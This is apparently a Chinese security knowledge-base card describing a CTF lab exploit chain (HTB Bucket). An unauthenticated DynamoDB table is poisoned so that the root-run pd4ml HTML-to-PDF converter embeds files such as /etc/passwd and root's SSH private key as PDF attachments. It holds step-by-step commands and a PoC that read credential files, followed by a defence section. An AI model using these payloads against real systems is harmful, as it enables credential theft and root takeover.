---
id: web-generic-ssrf-pd4ml-attachment-file-read-dynamodb-poison
title: DynamoDB 数据投毒驱动 pd4ml HTML 转 PDF：attachment 标签 file:// 协议以 root 身份读取任意文件
type: scenario
domain: web
path: web/generic/ssrf
technique: pd4ml-attachment-file-read
aliases:
- pd4ml 任意文件读取
- HTML 转 PDF LFI
- DynamoDB 数据投毒
- pd4ml:attachment
tags:
- ssrf
- lfi
- file-read
- pd4ml
- pdf
- html-converter
- dynamodb
- data-poisoning
- root
severity: high
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-T1-31
  verified_at: '2026-11-08T16:23:37+08:00'
  notes: 已对照原文与45张图核对：index.php get_alerts逻辑(Scan alerts/title=Ransomware/data写files/随机html/pd4ml转PDF)与源码一致、AssignUserID root root与127.0.0.1:8000监听见图证、create-table/put-item投毒、result.pdf出现test验证渲染链、pd4ml:attachment file:///etc/passwd与file:///root与file:///root/.ssh/id_rsa均以PDF附件形式读出(/etc/passwd内容、/root目录列表含.ssh、OPENSSH PRIVATE KEY)、root flag 7fdda731a4cfd824a796d00b0e6b5c63、ssh -i私钥登录root。alerts表定期清理的注意点与原文一致。与wkhtmltopdf卡(JS本地上下文执行)机制不同,dedup理由成立。未验证点：未复现pd4ml其他版本行为；frontmatter无sources。
---

## 一句话结论

当服务端把攻击者可控的数据（这里是无鉴权 DynamoDB 表中 `title=Ransomware` 记录的 `data` 字段）写入 HTML 并交给 pd4ml（Java HTML 转 PDF 库）以 root 身份渲染时，利用 pd4ml 专有标签 `<pd4ml:attachment src="file:///root/.ssh/id_rsa">`（文档定义"embeds external resource as PDF attachment"），即可让渲染进程按 file:// 协议读取任意路径并把文件内容嵌进生成的 PDF——实现从数据库写权限到 root 任意文件读取的完整链（HTB Bucket 靶机验证，读出 root 私钥登入）。

## 原理

- **数据流**：`index.php`（root 权限的 Apache VirtualHost，监听 127.0.0.1:8000）在 `POST action=get_alerts` 时用 DynamoDB `Scan` 过滤 `title = "Ransomware"` 的记录，把每条 `data` 字段原样 `file_put_contents` 写入 `files/<随机>.html`，再 `passthru("java ... Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf")` 转 PDF。数据从"数据库内容"到"HTML 模板"再到"PDF 渲染引擎输入"，全程无过滤。
- **为什么能投毒**：DynamoDB 端点（localhost:4566）无鉴权且 AWS CLI 凭证可伪造，攻击者可以 `create-table` 创建不存在的 `alerts` 表、`put-item` 插入 `title=Ransomware` 的恶意记录——应用认为的"内部告警数据"实际完全由攻击者定义。
- **渲染引擎的文件原语**：pd4ml 支持专有 XML 标签 `<pd4ml:attachment src="URL of attachment" description="..." icon="Paperclip">`，官方语义是把外部资源作为 PDF 附件嵌入。`src` 接受 URL，未限制协议，`file:///etc/passwd`、`file:///root`、`file:///root/.ssh/id_rsa` 均会被服务端进程读取并嵌入 result.pdf——相当于以运行渲染任务的进程身份（root）执行文件读取。
- **为何是 root**：Apache `000-default.conf` 对该 VirtualHost 配置 `AssignUserID root root`（监听 8000，`netstat -lnp` 可见 127.0.0.1:8000），渲染与文件读取都发生在 root 进程内，`/root` 目录与私钥均可读。
- **外带通道**：PDF 生成在 `files/`（可经 8000 端口 Web 访问，`ssh -L 8001:127.0.0.1:8000` 端口转发后浏览器打开 `127.0.0.1:8001/files/result.pdf`），PDF 内出现 Attachment 图标，双击即保存文件——文件内容外带无需额外信道。

## 触发条件

- 服务端把攻击者可控内容转成 HTML 并用 pd4ml/Pd4Cmd 渲染为 PDF；
- 渲染进程未被 sandbox 限制，可访问 file:// 协议与目标路径；
- 攻击者能影响渲染输入（直接 HTML 参数、数据库、上传文件等）。

## 利用步骤

1. 以无鉴权 DynamoDB 客户端创建 `alerts` 表（`title` HASH + `data` RANGE，均 S 类型）：`aws --endpoint-url=http://localhost:4566 dynamodb create-table ...`。
2. 插入投毒记录：`put-item --item '{"title":{"S":"Ransomware"},"data":{"S":"<html><h1>test</h1></html>"}}'`，先验证渲染链路（result.pdf 出现 test）。
3. 确认 8000 端口归属：`netstat -lnp` + Apache 配置 `AssignUserID root root`；`ssh -L 8001:127.0.0.1:8000 roy@host` 转发到本机。
4. `curl http://127.0.0.1:8001/index.php --data 'action=get_alerts'` 触发渲染。
5. 读文件：`put-item` 插入 `data = <html><pd4ml:attachment src='file:///etc/passwd' description='test' icon='Paperclip'/></html>`，重新触发后打开 result.pdf，双击附件得到 /etc/passwd。
6. 以 `file:///root` 列目录，再 `file:///root/.ssh/id_rsa` 读出 root 私钥；`chmod 600 id_rsa_1 && ssh -i id_rsa_1 root@target` 拿到 root。
7. 注意：`alerts` 表与 `files/` 下的产物会被定期清理，单次失败需从建表/插数到触发全流程重跑。

## PoC

```bash
aws --endpoint-url=http://localhost:4566 dynamodb put-item \
  --table-name alerts \
  --item '{"title":{"S":"Ransomware"},"data":{"S":"<html><pd4ml:attachment src=\"file:///root/.ssh/id_rsa\" description=\"test\" icon=\"Paperclip\"/></html>"}}'
curl http://127.0.0.1:8001/index.php --data 'action=get_alerts'
# 打开 127.0.0.1:8001/files/result.pdf，PDF 附件即 root 私钥
```

触发链完整：数据库写入 → root 进程渲染 → file:// 读取 → PDF 附件外带。

## 变体与关联

- 同族"文档转换器 LFI"：DOCX→PDF 转换器 `<img src>` 本地文件读取、wkhtmltopdf `<iframe src=file://>`、WeasyPrint file:// ——通用模式是"HTML 渲染引擎 + 未过滤的 src/file 协议"。
- 数据源不限于 DynamoDB：任何能注入渲染 HTML 的入口（参数、上传的 HTML/MD 模板、消息队列内容）等效。
- 渲染引擎若支持 http:// 则同时是 SSRF（打内网、云元数据 169.254.169.254）；本例因特权为 root 且 file:// 未过滤，直接升级为任意文件读取。
- 关联：[[web-generic-ssrf-docx-converter-image-local-file-read]]、[[web-generic-ssrf-image-proxy-url-param-file-scheme-arbitrary-read]]、[[cloud-dynamodb-unauth-scan-credential-ssh-lateral]]。

## 检测与防御

- 渲染引擎禁用 file:// 协议（自定义 URLStreamHandler 白名单仅 http/https 且目标受限），或以低权限用户 + chroot/seccomp 运行转换任务；切勿 `AssignUserID root`。
- 对进入渲染模板的数据做 HTML 净化，专有标签（`<pd4ml:*>`）一律转义；数据库内容按数据对待，不拼进模板。
- 监控渲染进程对敏感路径（/root、/etc/shadow、.ssh）的 open 读；PDF 附件体积/数量异常告警。
- 无鉴权数据库端点本身（前一篇卡）是链路起点：先修数据写入面，本链即断。
- 说明：仅适用于授权测试环境。
